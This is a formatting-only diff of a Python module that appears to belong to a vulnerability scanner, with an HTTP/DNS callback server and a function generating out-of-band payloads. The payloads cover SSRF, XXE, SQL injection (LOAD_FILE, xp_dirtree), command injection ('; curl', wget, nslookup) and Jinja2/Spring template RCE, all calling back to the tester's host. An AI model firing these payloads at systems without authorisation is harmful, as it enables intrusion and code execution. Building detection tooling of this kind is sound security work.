@@ -40,7 +40,7 @@ import asyncio
 import logging
 import socket
 import uuid
-from dataclasses import dataclass, field
+from dataclasses import dataclass
 from datetime import datetime
 from typing import Any, Callable, Optional
 
@@ -49,6 +49,7 @@ logger = logging.getLogger(__name__)
 # Try to import aiohttp, fallback gracefully
 try:
     from aiohttp import web
+
     AIOHTTP_AVAILABLE = True
 except ImportError:
     AIOHTTP_AVAILABLE = False
@@ -58,6 +59,7 @@ except ImportError:
 @dataclass
 class CallbackResult:
     """Result from a received callback."""
+
     callback_id: str
     callback_type: str  # "http" or "dns"
     received_at: datetime
@@ -80,6 +82,7 @@ class CallbackResult:
 @dataclass
 class PendingCallback:
     """Pending callback awaiting response."""
+
     callback_id: str
     created_at: datetime
     timeout: float
@@ -188,7 +191,7 @@ class HTTPCallbackServer:
     def _find_available_port(self) -> int:
         """Find an available port."""
         with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-            s.bind(('', 0))
+            s.bind(("", 0))
             return s.getsockname()[1]
 
     def _get_base_url(self) -> str:
@@ -555,7 +558,7 @@ class DNSProtocol(asyncio.DatagramProtocol):
                 if length == 0:
                     break
                 pos += 1
-                labels.append(data[pos:pos + length].decode('ascii', errors='ignore'))
+                labels.append(data[pos : pos + length].decode("ascii", errors="ignore"))
                 pos += length
 
             query_name = ".".join(labels)
@@ -938,6 +941,7 @@ class CallbackManager:
 
 # Convenience functions
 
+
 async def create_callback_server(
     port: int = 8888,
     external_host: Optional[str] = None,
@@ -974,40 +978,56 @@ def generate_oob_payloads(
     payloads = []
 
     if vuln_type in ("ssrf", "SSRF"):
-        payloads.extend([
-            (callback_url, "direct_url"),
-            (f"http://test@{callback_url.replace('http://', '')}", "userinfo_bypass"),
-            (f"{callback_url}?test=1", "with_query"),
-        ])
+        payloads.extend(
+            [
+                (callback_url, "direct_url"),
+                (f"http://test@{callback_url.replace('http://', '')}", "userinfo_bypass"),
+                (f"{callback_url}?test=1", "with_query"),
+            ]
+        )
 
     elif vuln_type in ("xxe", "XXE"):
-        payloads.extend([
-            (f'<!ENTITY xxe SYSTEM "{callback_url}">', "xxe_entity"),
-            (f'<!ENTITY % xxe SYSTEM "{callback_url}">%xxe;', "xxe_param_entity"),
-            (f'<xi:include href="{callback_url}"/>', "xinclude"),
-        ])
+        payloads.extend(
+            [
+                (f'<!ENTITY xxe SYSTEM "{callback_url}">', "xxe_entity"),
+                (f'<!ENTITY % xxe SYSTEM "{callback_url}">%xxe;', "xxe_param_entity"),
+                (f'<xi:include href="{callback_url}"/>', "xinclude"),
+            ]
+        )
 
     elif vuln_type in ("sql_injection", "sqli", "blind_sqli"):
         # DNS exfiltration payloads (MySQL, MSSQL, Oracle)
         domain = callback_url.replace("http://", "").replace("https://", "").split("/")[0]
-        payloads.extend([
-            (f"'; SELECT LOAD_FILE('\\\\\\\\{domain}\\\\test');-- ", "mysql_unc"),
-            (f"'; exec master..xp_dirtree '\\\\{domain}\\test';-- ", "mssql_xp_dirtree"),
-        ])
+        payloads.extend(
+            [
+                (f"'; SELECT LOAD_FILE('\\\\\\\\{domain}\\\\test');-- ", "mysql_unc"),
+                (f"'; exec master..xp_dirtree '\\\\{domain}\\test';-- ", "mssql_xp_dirtree"),
+            ]
+        )
 
     elif vuln_type in ("command_injection", "cmd", "rce"):
         domain = callback_url.replace("http://", "").replace("https://", "").split("/")[0]
-        payloads.extend([
-            (f"; curl {callback_url}", "curl_callback"),
-            (f"; wget {callback_url}", "wget_callback"),
-            (f"; nslookup {domain}", "nslookup_callback"),
-            (f"| curl {callback_url}", "pipe_curl"),
-        ])
+        payloads.extend(
+            [
+                (f"; curl {callback_url}", "curl_callback"),
+                (f"; wget {callback_url}", "wget_callback"),
+                (f"; nslookup {domain}", "nslookup_callback"),
+                (f"| curl {callback_url}", "pipe_curl"),
+            ]
+        )
 
     elif vuln_type in ("ssti", "SSTI"):
-        payloads.extend([
-            (f'{{{{config.__class__.__init__.__globals__["os"].popen("curl {callback_url}").read()}}}}', "jinja2_rce"),
-            (f'${{T(java.lang.Runtime).getRuntime().exec("curl {callback_url}")}}', "spring_el"),
-        ])
+        payloads.extend(
+            [
+                (
+                    f'{{{{config.__class__.__init__.__globals__["os"].popen("curl {callback_url}").read()}}}}',
+                    "jinja2_rce",
+                ),
+                (
+                    f'${{T(java.lang.Runtime).getRuntime().exec("curl {callback_url}")}}',
+                    "spring_el",
+                ),
+            ]
+        )
 
     return payloads
